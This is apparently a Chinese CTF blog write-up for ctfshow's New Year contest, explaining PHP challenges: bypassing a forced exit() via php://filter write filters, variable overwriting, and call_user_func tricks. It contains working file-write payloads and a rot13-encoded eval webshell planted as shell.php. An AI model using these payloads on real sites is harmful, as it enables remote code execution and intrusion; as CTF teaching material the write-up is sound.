<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="热身 这个确实是热身，一开始以为直接找flag就行，但是没找到，后面查看了一下phpinfo找到了一个路径  auto_prepend_file 是 PHP 的一个配置选项，用于指定在每个 PHP 脚本执行之前自动包含的文件。 这个文件路径看着比较可疑，所以我去读取了一下，果然是有flag的 web1 #死亡exit()绕过意思就是我们无论写入什么都会因为插入一句exit()去强制结束运行 需要绕">
<meta property="og:type" content="article">
<meta property="og:title" content="ctfshow新春欢乐赛(已做完)">
<meta property="og:url" content="https://wanth3f1ag.top/2025/04/17/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B(%E5%B7%B2%E5%81%9A%E5%AE%8C)/index.html">
<meta property="og:site_name" content="root@wanth3f1ag">
<meta property="og:description" content="热身 这个确实是热身，一开始以为直接找flag就行，但是没找到，后面查看了一下phpinfo找到了一个路径  auto_prepend_file 是 PHP 的一个配置选项，用于指定在每个 PHP 脚本执行之前自动包含的文件。 这个文件路径看着比较可疑，所以我去读取了一下，果然是有flag的 web1 #死亡exit()绕过意思就是我们无论写入什么都会因为插入一句exit()去强制结束运行 需要绕">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250131233707641.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/15cc588af87ce617a13ab1fa6e7f4f8.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250131234637782.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250131235820576.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250201000208526-1738339332131-5.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250201002624053-1738340786006-7.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250202170304506-1738486988529-1.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250202172335064-1738488216562-7.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250202173408231.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250203110917269.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250203111403687-1738552445715-11.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250216222140948.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250217200805741.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250417200519025.png">
<meta property="og:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250417202622078.png">
<meta property="article:published_time" content="2025-04-17T12:20:14.000Z">
<meta property="article:modified_time" content="2025-04-17T12:47:08.388Z">
<meta property="article:author" content="wanTh3flag">
<meta property="article:tag" content="新春欢乐赛">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://wanth3f1ag.top/image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250131233707641.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>ctfshow新春欢乐赛(已做完)</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	

<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">H0me</a></li><!--
     --><!--
       --><li><a href="/about/">A6out</a></li><!--
     --><!--
       --><li><a href="/tags/">T6gs</a></li><!--
     --><!--
       --><li><a href="/categories/">Catagory</a></li><!--
     --><!--
       --><li><a href="/links/">L1nks</a></li><!--
     --><!--
       --><li><a href="/search/">s4arch</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/04/17/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/04/16/TGCTF2025/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://wanth3f1ag.top/2025/04/17/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://wanth3f1ag.top/2025/04/17/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&text=ctfshow新春欢乐赛(已做完)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://wanth3f1ag.top/2025/04/17/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=ctfshow新春欢乐赛(已做完)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://wanth3f1ag.top/2025/04/17/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&is_video=false&description=ctfshow新春欢乐赛(已做完)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ctfshow新春欢乐赛(已做完)&body=Check out this article: https://wanth3f1ag.top/2025/04/17/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B(%E5%B7%B2%E5%81%9A%E5%AE%8C)/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://wanth3f1ag.top/2025/04/17/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=ctfshow新春欢乐赛(已做完)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://wanth3f1ag.top/2025/04/17/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=ctfshow新春欢乐赛(已做完)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://wanth3f1ag.top/2025/04/17/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=ctfshow新春欢乐赛(已做完)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://wanth3f1ag.top/2025/04/17/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&title=ctfshow新春欢乐赛(已做完)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://wanth3f1ag.top/2025/04/17/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&name=ctfshow新春欢乐赛(已做完)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://wanth3f1ag.top/2025/04/17/ctfshow%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B(%E5%B7%B2%E5%81%9A%E5%AE%8C)/&t=ctfshow新春欢乐赛(已做完)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%83%AD%E8%BA%AB"><span class="toc-number">1.</span> <span class="toc-text">热身</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web1"><span class="toc-number">2.</span> <span class="toc-text">web1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AD%BB%E4%BA%A1exit-%E7%BB%95%E8%BF%87"><span class="toc-number">2.1.</span> <span class="toc-text">#死亡exit()绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8D"><span class="toc-number">2.2.</span> <span class="toc-text">第一种:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#base64%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.0.1.</span> <span class="toc-text">base64编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rot13%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.0.2.</span> <span class="toc-text">rot13编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%99%A8%E5%B5%8C%E5%A5%97%E7%BB%95%E8%BF%87"><span class="toc-number">2.2.0.3.</span> <span class="toc-text">过滤器嵌套绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8D"><span class="toc-number">2.3.</span> <span class="toc-text">第二种</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#rot13%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87-1"><span class="toc-number">2.3.0.1.</span> <span class="toc-text">rot13编码绕过</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web2"><span class="toc-number">3.</span> <span class="toc-text">web2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">3.1.</span> <span class="toc-text">#变量覆盖</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web3"><span class="toc-number">4.</span> <span class="toc-text">web3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%94%E5%9B%9Etrue%E7%9A%84%E6%97%A0%E5%8F%82%E6%95%B0%E5%87%BD%E6%95%B0"><span class="toc-number">4.1.</span> <span class="toc-text">#返回true的无参数函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web4"><span class="toc-number">5.</span> <span class="toc-text">web4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%94%E5%9B%9E%E5%90%8E%E7%BC%80%E5%90%8D%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">5.1.</span> <span class="toc-text">#返回后缀名的函数</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web5"><span class="toc-number">6.</span> <span class="toc-text">web5</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8%E5%86%85%E5%AD%98%E6%BA%A2%E5%87%BA%E7%BB%95%E8%BF%87file-put-contents%E6%9C%BA%E5%88%B6"><span class="toc-number">6.1.</span> <span class="toc-text">#使用内存溢出绕过file_put_contents机制</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web6"><span class="toc-number">7.</span> <span class="toc-text">web6</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8"><span class="toc-number">7.1.</span> <span class="toc-text">#字符串逃逸</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web7"><span class="toc-number">8.</span> <span class="toc-text">web7</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">8.1.</span> <span class="toc-text">#session反序列化</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        ctfshow新春欢乐赛(已做完)
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">wanTh3flag</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-04-17T12:20:14.000Z" class="dt-published" itemprop="datePublished">2025-04-17</time>
        
        (Updated: <time datetime="2025-04-17T12:47:08.388Z" class="dt-updated" itemprop="dateModified">2025-04-17</time>)
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/ctfshow/">ctfshow</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/" rel="tag">新春欢乐赛</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="热身"><a href="#热身" class="headerlink" title="热身"></a>热身</h1><p><img src="/../image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250131233707641.png" alt="image-20250131233707641"></p>
<p>这个确实是热身，一开始以为直接找flag就行，但是没找到，后面查看了一下phpinfo找到了一个路径</p>
<p><img src="/../image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/15cc588af87ce617a13ab1fa6e7f4f8.png" alt="15cc588af87ce617a13ab1fa6e7f4f8"></p>
<p>auto_prepend_file 是 PHP 的一个配置选项，用于指定在每个 PHP 脚本执行之前自动包含的文件。</p>
<p>这个文件路径看着比较可疑，所以我去读取了一下，果然是有flag的</p>
<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><p><img src="/../image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250131234637782.png" alt="image-20250131234637782"></p>
<h2 id="死亡exit-绕过"><a href="#死亡exit-绕过" class="headerlink" title="#死亡exit()绕过"></a>#死亡exit()绕过</h2><p>意思就是我们无论写入什么都会因为插入一句exit()去强制结束运行</p>
<p>需要绕过exit()的地方一般都是<code>file_put_contents</code></p>
<p>主要思路：利用php伪协议的写过滤器，对即将要写的内容（content）进行处理后，会将&lt;?php exit();处理成php无法解析的内容，而我们的content则会被处理成正常的payload。</p>
<p>大致有如下三种</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);</span><br><span class="line">file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);</span><br><span class="line">file_put_contents($filename,$content . &quot;\nxxxxxx&quot;);</span><br></pre></td></tr></table></figure>

<h2 id="第一种"><a href="#第一种" class="headerlink" title="第一种:"></a>第一种:</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($filename,&quot;&lt;?php exit();&quot;.$content);</span><br></pre></td></tr></table></figure>

<h4 id="base64编码绕过"><a href="#base64编码绕过" class="headerlink" title="base64编码绕过"></a>base64编码绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/convert.base64-decode/resource=shell.php</span><br><span class="line">content=aPD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure>

<p>利用<code>php://filter</code>，先将内容进行解码后再写入文件</p>
<p><code>&lt;?php phpinfo();?&gt;</code>base64编码后为<code>aPD9waHAgcGhwaW5mbygpOz8+</code>，至于为什么前面要加个<code>a</code>，是因为base64解码以4个字节为1组转换为3个字节，前面的<code>&lt;?php exit();</code>符合base64编码的只有<code>phpexit</code>这7个字节，因此添加一个字节来满足编码</p>
<h4 id="rot13编码绕过"><a href="#rot13编码绕过" class="headerlink" title="rot13编码绕过"></a>rot13编码绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/convert.string.rot13/resource=shell.php</span><br><span class="line">content=&lt;?cuc cucvasb();?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="过滤器嵌套绕过"><a href="#过滤器嵌套绕过" class="headerlink" title="过滤器嵌套绕过"></a>过滤器嵌套绕过</h4><p>一种payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename=php://filter/string.strip_tags|convert.base64-decode/resource=shell.php</span><br><span class="line">content=?&gt;PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure>

<p><code>string.strip_tags</code>可以过滤掉html标签和php标签里的内容，然后再进行base64解码</p>
<h2 id="第二种"><a href="#第二种" class="headerlink" title="第二种"></a>第二种</h2><p>第二种情况也就是我们题目中的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents($content,&quot;&lt;?php exit();&quot;.$content);</span><br></pre></td></tr></table></figure>

<h4 id="rot13编码绕过-1"><a href="#rot13编码绕过-1" class="headerlink" title="rot13编码绕过"></a>rot13编码绕过</h4><p>首先我们要了解一下rot13加密</p>
<p><img src="/../image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250131235820576.png" alt="image-20250131235820576"></p>
<p>了解了rot13转换之后，我们可以想到，他只会把字母替换，而其他的数字、符号不受影响<br>那么我们就可以这样来想，破坏掉<code>exit</code>来插入我们想要执行的语句</p>
<p>例如我们想构造phpinfo</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?cuc cucvasb();?&gt;为&lt;?php phpinfo();?&gt;的rot13加密转化</span><br></pre></td></tr></table></figure>

<p>那我们试着传入这个文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">content=php://filter/write=string.rot13|&lt;?cuc cucvasb();?&gt;|/resource=shell.php</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong><code>php://filter</code></strong>: 这是 PHP 提供的一种流过滤器，可以对输入流进行处理。</p>
</li>
<li><p><strong><code>write=string.rot13</code></strong>:这是一个写过滤器，表示对数据进行 ROT13 加密。</p>
</li>
<li><p><strong><code>/resource=shell.php</code></strong>: 这是指定的资源文件，可能是一个 PHP 文件。</p>
</li>
</ul>
<p>然后我们访问shell.php可以看到成功执行了</p>
<p><img src="/../image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250201000208526-1738339332131-5.png" alt="image-20250201000208526"></p>
<p>说明我们的exit是已经被破坏掉了，这时候我们写入一句话木马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?content=php://filter/write=string.rot13|&lt;?cuc @riny($_CBFG[cmd]);?&gt;|/resource=shell.php</span><br></pre></td></tr></table></figure>

<p>注意这个密码cmd不是我们的密码，而是rot13加密后的密码，所以这个密码正确的应该是pzq(一直以为是我马子没写进去，疯狂传马，后面才意识到这个问题)</p>
<p><img src="/../image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250201002624053-1738340786006-7.png" alt="image-20250201002624053"></p>
<p>看到自己写了这么多马，笑死了</p>
<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="#变量覆盖"></a>#变量覆盖</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2022-01-16 15:42:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2022-01-24 22:14:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$_POST</span>)===<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">call_user_func</span>($$$$$$&#123;<span class="title function_ invoke__">key</span>(<span class="variable">$_POST</span>)&#125;)===<span class="string">&quot;HappyNewYear&quot;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先关注的是call_user_func()那句话，如果这个函数存在并返回的结果是字符串，但是我们还是需要重点了解语句里面的<code>$$$$$$&#123;key($_POST)&#125;</code></p>
<p>我们先举一个简单的例子</p>
<p><img src="/../image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250202170304506-1738486988529-1.png" alt="image-20250202170304506"></p>
<p>可以看到经过这个变量的多层覆盖，最终可以实现正常的运行结果</p>
<p>这里要求call_user_func执行 post第一个参数的返回值为Happynewyear，但是这里call_user_func会把参数当作函数来执行，同时只有这一个函数，因此我们需要一个无参数函数返回值为 Happynewyear</p>
<p>一开始想着post传入HappyNewYear&#x3D;a然后get传入a&#x3D;HappyNewYear去进行变量覆盖的但是没打通,忘记这里是有一个call_user_func函数了</p>
<p>观察题目发现有一句session_start(); ，这里我们可以用session_id函数 ，他会返回PHPSESSID的值，我们设定PHPSESSID为Happynewyear</p>
<p><img src="/../image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250202172335064-1738488216562-7.png" alt="image-20250202172335064"></p>
<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><h2 id="返回true的无参数函数"><a href="#返回true的无参数函数" class="headerlink" title="#返回true的无参数函数"></a>#返回true的无参数函数</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$key</span>=  <span class="title function_ invoke__">call_user_func</span>((<span class="variable">$_GET</span>[<span class="number">1</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key</span>==<span class="string">&quot;HappyNewYear&quot;</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;虎年大吉，新春快乐！&quot;</span>);</span><br><span class="line"></span><br><span class="line">虎年大吉，新春快乐！</span><br></pre></td></tr></table></figure>

<p>这里的话是一个弱比较的绕过，只要让判断结果为true就可以了，我们可以传入session_start</p>
<p><strong>session_start()函数 —</strong> <strong>启动新会话或者重用现有会话</strong></p>
<p><strong>成功开始会话返回 true ，反之返回 false</strong></p>
<p>当然这里不只是可以用session_start，那种返回值是true的无参数函数基本上也都可以用</p>
<p><img src="/../image/achieve/202411/%E6%96%B0%E6%98%A5%E6%AC%A2%E4%B9%90%E8%B5%9B/image-20250202173408231.png" alt="image-20250202173408231"></p>
